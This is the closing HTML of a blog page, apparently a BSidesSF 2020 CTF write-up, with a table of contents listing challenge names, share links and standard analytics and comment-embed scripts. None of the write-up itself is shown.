href="#376pts-cards"><span class="toc-number">1.</span> <span class="toc-text">[376pts] cards</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-csp-1"><span class="toc-number">2.</span> <span class="toc-text">[51pts] csp-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-csp-2"><span class="toc-number">3.</span> <span class="toc-text">[51pts] csp-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#87pts-fun-with-flags"><span class="toc-number">4.</span> <span class="toc-text">[87pts] fun with flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-had-a-bad-day"><span class="toc-number">5.</span> <span class="toc-text">[51pts] had a bad day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#157pts-recipes"><span class="toc-number">6.</span> <span class="toc-text">[157pts] recipes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-simple-todos"><span class="toc-number">7.</span> <span class="toc-text">[51pts] simple todos</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/BSidesSF-2020-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/BSidesSF-2020-CTF/&text=BSidesSF 2020 CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>